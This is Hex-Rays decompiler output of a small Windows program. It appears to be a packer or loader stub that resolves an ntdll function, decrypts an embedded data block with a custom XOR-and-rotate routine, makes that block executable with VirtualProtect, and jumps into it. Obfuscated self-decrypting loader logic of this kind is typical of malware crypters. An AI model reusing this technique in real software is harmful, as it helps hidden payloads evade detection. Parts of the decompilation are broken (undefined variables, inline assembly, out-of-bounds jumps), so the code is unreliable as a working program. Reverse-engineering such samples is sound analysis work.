/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __stdcall sub_425C8E(_DWORD *, unsigned int, int);
// void __usercall start(_BYTE *@<ebx>, int _EDI@<edi>, int@<esi>);

//-------------------------------------------------------------------------
// Data declarations

// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern UINT (__stdcall *GetACP)();
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetOEMCP)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
CHAR ModuleName[] = "ntdll.dll"; // idb
CHAR ProcName[] = "ZwUnloadKey"; // idb
CHAR FileName[] = ".Cvc"; // idb
_DWORD dword_53203B[9] =
{
  603524063,
  1540217163,
  1177360500,
  1660461905,
  -1296829089,
  977023478,
  1037858044,
  1915220986,
  -849230750
}; // weak


//----- (00425C8E) --------------------------------------------------------
void __stdcall sub_425C8E(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // edi

  v4 = a2 >> 2;
  do
  {
    *a1 ^= a3;
    *a1 -= 1012498734;
    *a1 += a3;
    *a1 ^= 0xDCF31265;
    *a1 = __ROL4__(*a1, 108);
    *a1 ^= a3;
    *a1 ^= a3;
    *a1 = __ROR4__(*a1, 216);
    *a1 ^= 0xC4730691;
    *a1++ ^= a3;
    --v4;
  }
  while ( v4 );
}

//----- (00425CE8) --------------------------------------------------------
void __usercall start(_BYTE *a1@<ebx>, int _EDI@<edi>, int a3@<esi>)
{
  FARPROC ZwUnloadKey; // eax
  char v5; // cf
  char v6; // ch
  int v7; // ecx
  char v8; // dh
  HMODULE ModuleHandleA; // [esp-Ch] [ebp-20h]
  int v11; // [esp-4h] [ebp-18h]
  DWORD flOldProtect; // [esp+0h] [ebp-14h] BYREF
  HRSRC hResInfo; // [esp+4h] [ebp-10h]
  HGLOBAL Resource; // [esp+8h] [ebp-Ch]
  LPSTR CommandLineA; // [esp+10h] [ebp-4h]

  ModuleHandleA = GetModuleHandleA(ModuleName);
  GetCurrentThreadId();
  ZwUnloadKey = GetProcAddress(ModuleHandleA, ProcName);
  v11 = ((int (__stdcall *)(_DWORD))ZwUnloadKey)(0);
  CommandLineA = GetCommandLineA();
  sub_425C8E(dword_53203B, 0x8E02u, v11);
  GetOEMCP();
  GetCommandLineW();
  GetOEMCP();
  GetCurrentProcessId();
  VirtualProtect(dword_53203B, 0x8E02u, 0x40u, &flOldProtect);
  hResInfo = (HRSRC)CreateFileA(FileName, 0xA0000000, 6u, 0, 3u, 0x1A1u, 0);
  GetACP();
  Resource = LoadResource(0, hResInfo);
  LOWORD(_EAX) = GetFileSize(hResInfo, 0);
  BYTE1(v7) = *(_BYTE *)(a3 - 98) + v5 + v6;
  *(_BYTE *)(v7 - 2104612619) = (_BYTE)a1;
  _EAX = (__int16)_EAX;
  LOBYTE(_EAX) = _EAX - 31;
  __asm { rcl     byte ptr [edi+65h], 99h }
  BYTE1(_EAX) = 38;
  _EAX ^= 0xC9982BE9;
  __asm { aas }
  *a1 += v8 & BYTE1(v7);
  JUMPOUT(0x53208C);
}
// 53208B: control flows out of bounds to 53208C
// 532060: variable 'v5' is possibly undefined
// 532060: variable 'v6' is possibly undefined
// 532063: variable 'v7' is possibly undefined
// 532070: variable 'v8' is possibly undefined
// 53203B: using guessed type _DWORD dword_53203B[9];

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
